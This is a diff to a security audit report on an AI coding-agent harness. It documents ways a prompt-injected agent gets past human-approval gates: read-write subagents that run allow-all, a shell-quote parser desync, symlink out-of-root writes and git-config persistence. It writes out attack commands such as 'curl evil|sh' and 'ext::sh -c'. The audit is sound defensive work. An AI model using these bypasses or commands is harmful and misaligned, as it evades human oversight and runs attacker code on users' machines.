@@ -4,6 +4,31 @@ Branch: `claude/pensive-hopper-yrtoyd`
 Started: 2026-09-16
 Method: multi-agent, multi-wave, first-principles code analysis (no changelog/git-diff/internet).
 
+## EXECUTIVE SUMMARY (3 waves, 14 agent-runs; every confirmed bug independently re-verified by the root agent)
+
+**6 confirmed high-impact findings**, severity calibrated by the adversarial red-team against **stock default config** (`--posture strict`, `--trust-project=false`, guardrails off, Shell on):
+
+| # | Finding | Class | Stock-default reachability | Notes |
+|---|---------|-------|----------------------------|-------|
+| **F5** | `Subagent{mode:"read-write"}` runs allow-all Edit/Write/Shell on the real workspace | **RCE / ask-floor bypass** | ✅ **YES — zero flag, zero approval, at `strict`** | STRONGEST; a prompt-injected model escapes strict's per-mutate Ask entirely. "By design" (ADR 0077) but no second gate. |
+| **F1** | Shell-gate `\'`/`\"` parser desync smuggles commands past the read-only gate | **RCE / control bypass** | ⚠️ silent only under `auto`/`yolo` or configured guardrails; bare `strict` degrades deny-dominance + plan-mode to Ask (human still sees the raw command) | `auto` = docs' "recommended unattended default" → silent there. Breaks 4 invariants. |
+| **F6** | goccy YAML O(n²) parse bomb via a repo `.mecatl/settings.yaml` | **DoS (OOM)** | ✅ pre-trust, unauth in multi-tenant | Also OOMs `mecatui` during the trust *probe*, before the trust prompt. |
+| **F2** | Forker merge-back `copyFile` follows a destination-side symlink | **Sandbox escape (out-of-root write)** | ✅ via default-on Parallel auto-merge, no approval | Arbitrary write → `~/.ssh`, `.git/hooks`, settings. Needs a tracked symlink in the repo. |
+| **F4** | Unbounded HTTP request body + missing `ReadTimeout` | **DoS (OOM / slowloris)** | ✅ unauth on the no-auth bind; low-priv authenticated otherwise | ~18 handlers; gRPC safe. |
+| **CB** | Read-only subagent → persistent parent RCE via shared `.git/config` | **RCE / persistence** | ⚠️ needs `TrustProject=true` (posture `trusted`/`--trust-project`/accepted trust-prompt) | Real escalation there; redundant under `auto`/`yolo`. Reproduced (hook fired on parent's `git add`). |
+
+**Lower-severity confirmed/candidate:** CANDIDATE-3 (LOW, local-only client-MCP SSRF), CANDIDATE-4 (MEDIUM, hostile-upstream quadratic text DoS + a negative-usage brake-disable), CANDIDATE-5 (MEDIUM conditional, `learning.mode:auto`+trusted stored-injection via an auto-activated unfenced skill).
+
+**Root-cause clusters (fix these and most findings collapse):**
+1. **The child (subagent) permission policy is blanket allow-all** (`childRules`→`permpolicy.AllowAllFloorRules()`); a child's tool calls NEVER produce an Ask, so child safety rests entirely on catalog+isolation — which the writable child (F5) and the git-config escape (CB) both defeat. → give children a real mutate-ask floor / the isolation classifier BEFORE the allow-all Allow.
+2. **Hand-rolled shell scanner** (`SplitCommands`) diverges from `/bin/sh` (F1). → use the vendored `mvdan.cc/sh` parser; fuzz vs `sh -c`.
+3. **Missing input bounds** — no YAML depth cap (F6), no HTTP body cap / `ReadTimeout` (F4), no streamed-text cap (CAND-4). → bound every untrusted-input ingress.
+4. **Copy routines without `O_NOFOLLOW`/`os.Root`** in the forker (F2). → confine merge-back writes through `os.Root`.
+
+**Strong NEGATIVES (audited hard, no bug):** front-door auth (constant-time bearer, ownership fail-closed) + the delegated `toolhive-core/authn` JWT validator (12/12 forged-token PoC — no `alg:none`/HS-confusion/aud/iss/sig bypass); scheduler owner-isolation; snapshot/event-fold rehydration (millions of fuzz execs, zero panics); MCP broker/VMCP/OAuth; the main `osfs` file-tool confinement (`os.Root` airtight); CORS. **No authentication or cross-tenant authorization bypass exists on the shipped ingress.** (grpcdriver's auth-free owner-from-wire server is test-only, not shipped.)
+
+---
+
 ## Threat model / win conditions
 - Remote process crash (DoS) by an authenticated or unauthenticated user.
 - Server-side arbitrary command execution (RCE) — remote, auth or unauth.
@@ -56,7 +81,12 @@ Status legend: 🔵 active · 🟡 stalled · 🔴 blocked · ✅ confirmed find
 - L6: clone + audit `toolhive-core/authn` validator construction (alg allowlist/audience/JWKS) — the one un-read dependency behind the whole auth story.
 - Underexplored NEW families: (i) MCP broker `VMCP` token endpoint (F3 residual); (ii) client-MCP tool registration path; (iii) compaction/event-fold hostile-snapshot; (iv) provider SSE→chunk parsing under a hostile upstream. Keep F2 result incoming.
 
-### Wave 3 — candidates (uncovered families)
+### Wave 3 — COMPLETE
+- W3-A learning/persistence → CANDIDATE-5 (conditional stored-injection) + F8-2 hardening; subagents-never-learn / untrusted-repo-blocked dead-ends.
+- W3-B adversarial red-team → all 3 RCE findings SURVIVE; F5 strongest (stock-strict, zero-flag), F1 silent only under auto/yolo/guardrails, CB downgraded (needs TrustProject).
+- W3-C scheduler/mecatequi/grpcdriver → all hardened; mecatequi-YAML-bomb falsified; L1 (grpcdriver) downgraded to test-only.
+
+### Wave 3 — original candidate list (for reference)
 - **F8 learning/persistence (`engine/learning/*`):** reflection→proposal→materializer→skill drafting + admission/activation gates. Stored-injection vector: can prompt-injected/untrusted content produce a DURABLE learned skill/memory that AUTO-ACTIVATES (validated/evaluated activation) and steers future sessions without re-approval? A learned SKILL that later runs = persistence + escalation. Not yet audited.
 - grpcdriver deep (L1) — what a malicious/attacker-reachable driver can do beyond owner-spoof (it's the storage backend; a compromised driver = full state control).
 - cmd/mecatui remote transport / OIDC (ADR 0277/0284) reauth-owner-recovery — partial overlap W2-B.
@@ -76,7 +106,9 @@ Status legend: 🔵 active · 🟡 stalled · 🔴 blocked · ✅ confirmed find
 - **(A) Plan-mode hard-deny bypass** — `planModeDecision` (`evaluator.go`) only hard-denies when `ReadOnlyShell==false`; a smuggled mutation reads `true`, so plan mode (contract: mutations impossible) degrades it to Ask/Allow, and *presents it as read-only*.
 - **(C) Guardrail skip** — the default Shell guardrail sets `SkipReadOnlyShell:true` (`internal/app/guardrails.go`); `echo \' ; curl evil|sh` reads read-only ⇒ the PreToolUse content checker never inspects it.
 - `writeIndicators` catches bare `rm`/`mv`/`cp`/`chmod` tokens even in the swallowed segment (so `rm` → false), but `git commit`/`git push`/`sed -i`/`curl`/`python3 -c`/`sh -c`/`make` are NOT in that set and classify read-only.
-**Reachability:** the `command` string is the model's Shell arg, executed verbatim; any prompt-injected/misaligned model with Shell triggers it. **Fix:** model an unquoted `\` as escaping one following char in BOTH scanners (so `\'`/`\"` don't enter quote state), or replace the hand-rolled scanner with the already-vendored `mvdan.cc/sh` parser; fuzz against `sh -c`.
+**Reachability:** the `command` string is the model's Shell arg, executed verbatim; any prompt-injected/misaligned model with Shell triggers it.
+**Red-team calibration (W3-B, SURVIVES):** breaks 4 documented invariants. The SILENT/unattended-RCE form needs allow-all (`auto`/`yolo`) or configured guardrails: deny-dominance → silent Allow under `auto`/`yolo` (`auto` is the docs' "recommended UNATTENDED default"), plan-mode → silent Allow under `yolo`+plan. In BARE stock `strict` (no operator deny/plan/guardrails) Shell→Ask either way and the human sees the full raw command, so it is NOT zero-interaction there — but it silently downgrades a targeted `Deny Shell "git push"` and plan-mode's hard-Deny to Ask, and defeats `learnablePattern` compound-refusal. Broader than git: `echo \' ; curl evil|sh` classifies read-only.
+**Fix:** model an unquoted `\` as escaping one following char in BOTH scanners (so `\'`/`\"` don't enter quote state), or replace the hand-rolled scanner with the already-vendored `mvdan.cc/sh` parser; fuzz against `sh -c`.
 
 ### ✅ CONFIRMED-2 (F5, HIGH) — direct-write `Subagent{mode:"read-write"}` bypasses the mutate-ask gate + guardrails (zero-approval RCE on the real workspace)
 A prompt-injected main model, on the DEFAULT `strict` posture + any FS session, emits ONE tool call `Subagent{"mode":"read-write","prompt":"<malicious>"}` and gets arbitrary Edit/Write/Shell against the REAL workspace with **no human approval and no guardrail check** — where the main agent would Ask for every one of those.
@@ -90,6 +122,7 @@ A prompt-injected main model, on the DEFAULT `strict` posture + any FS session, 
 **Fix:** build the writable-subagent engine with the MAIN policy (`mainRules`+`mainEvaluatorOptions`, or at least the mutate-ask floor) AND wire the guardrail Runner into it; the runner is already main-parity, the policy/hooks are not.
 **Convergence w/ F1-secondary:** the SAME `childRules` allow-all also means an *isolated* read-only child auto-Allows plain escape verbs (`git config core.pager '!cmd'` writing shared `.git/config`, `rm -rf <abs>`, `git push`) — only substitution is floored. Shared root cause: child policy is allow-all; only substitution gates child Shell.
 **Chain-A fully weaponized (W2-C, proven with real governance):** one `Subagent{mode:read-write}` call → Edit/Write/Shell all `allow` (proven), exec on the child's FIRST `Shell{curl attacker|sh}`, zero human approvals, reachable at `strict` (posture does NOT gate it). **Privilege inversion:** on the MAIN engine Edit/Shell=`ask`, but the writable child it spawns runs them `allow` — the child is MORE privileged than its parent. `--no-bash` still gives code-exec via an in-repo build/CI/hook file the child writes. Falsified only by an operator `Subagent: deny/ask` above the floor, or the `no-fs` profile.
+**Red-team verdict (W3-B): SURVIVES — the STRONGEST of all findings.** Independently re-derived reachable at **stock `strict`/interactive/no-config/default-FS session with ZERO non-default flag and ZERO human approval** (writable child wired unconditionally except `no-fs`; `validateMode` has no posture/trust/interactive gate; child allow-all yields no `PendingAsk` so `resolveChildAsk`/surfacing never fires). Documented as intended direct-write (ADR 0077/0041) so maintainers may call it "by design" — but the allow-all child policy under `strict` is a genuine per-mutate ask-floor bypass with **no second gate**. This is the one finding needing no non-default posture.
 
 ### SECONDARY (F5, MEDIUM, under verification) — `git remote`/`git tag` classified read-only
 `engine/governance/shell.go` `readOnlyGitSubcommands` includes `remote` and `tag`; `simpleReadOnly` checks only the subcommand, not args ⇒ `git tag <name>` (writes a ref), `git remote add`/`git remote set-url origin ext::sh -c '<cmd>'` (writes `.git/config`, stages code-exec on next fetch) classified read-only. Impact: plan-mode mutation + A1/global read-only-substitution misclassification. `git config` is correctly excluded but `remote`/`tag` were missed. `worktreeEscapeGitSubcommands` rejects `remote` (A2 safe) but NOT `tag`.
@@ -130,6 +163,7 @@ A default (read-only) `Subagent` runs its Shell in a `git worktree add --detach`
 **Non-TTY exec keys that fire on commands agents run constantly** (W2-C measured): `core.fsmonitor` (fires on `git status`/`diff`/`add` — strongest), `core.hooksPath` (post-index-change/pre-commit/…), `diff.external` (`git diff`/`log -p`/`show`), `alias.*`=`!sh`, `core.sshCommand` (network ops), `credential.helper` (https ops). `core.pager` is TTY-only (weaker vs a headless agent).
 **gitenv gap:** the MAIN runner (which the parent uses) is `envscrub.ScrubWithInherited` ONLY, NOT `gitenv.Scrub` (`build.go:6289-6293`, `command_runner.go:57-63` — "the operator's own hooks/pager are honoured here"). So gitenv's neutralizing overrides (`core.hooksPath=/dev/null`, `core.pager=cat`, `core.fsmonitor=false`, `GIT_CONFIG_NOSYSTEM`) are NOT applied → the injected shared config fires. `envscrub` is a secret-shaped denylist only.
 **Reachability:** the read-only-subagent Shell is trust-gated (`sandboxedShellAvailable = !NoShell && Shell!="" && TrustProject`, `build.go:6377-6379`; TrustProject raised at posture trusted/auto/yolo on interactive roots, or `--trust-project`/trusted-workspaces/remembered). So it needs a TRUSTED repo — but that is EXACTLY the scenario the worktree+gitenv+trust design was built to make safe ("delegate read-only exploration in a repo you trust"), and Chain-B defeats it. Also survives deployments that deny child Edit/Write while allowing Shell for build/test.
+**Red-team verdict (W3-B): SURVIVES but DOWNGRADED — not stock-default-reachable** (`TrustProject=false` at stock strict ⇒ no child shell). Genuine ESCALATION precisely at `TrustProject=true` AND `AllowAllTools=false` (posture `trusted`, or `strict`+`--trust-project`, or an ACCEPTED mecatui trust-prompt): there the MAIN Shell is Ask-gated (a human would see a `git config`) but the read-only subagent runs it UNPROMPTED under allow-all. Redundant under `auto`/`yolo` (main Shell already allow-all). W3-B empirically confirmed the sandboxed `gitenv` overrides only affect the child's git READS — the WRITE lands in the shared config and the parent's later reads fire it. Sharpest issue: allow-all child policy silently defeats A2's coded `git config` rejection.
 **Asymmetric gates (design smell):** the weaker-capability isolated read-only path is trust-gated; the stronger direct-write path (CONFIRMED-2) is NOT posture/trust-gated at all. The more dangerous primitive has fewer preconditions.
 **Fix:** the child Shell must resolve `git config` (and the other escape verbs) through the isolation/escape classifier BEFORE the allow-all policy returns Allow (i.e. floor these to the child-ask model, not only substitution); and/or apply `gitenv.Scrub` to the main runner; and/or set `extensions.worktreeConfig`/`GIT_CONFIG_*` isolation on the fork.
 
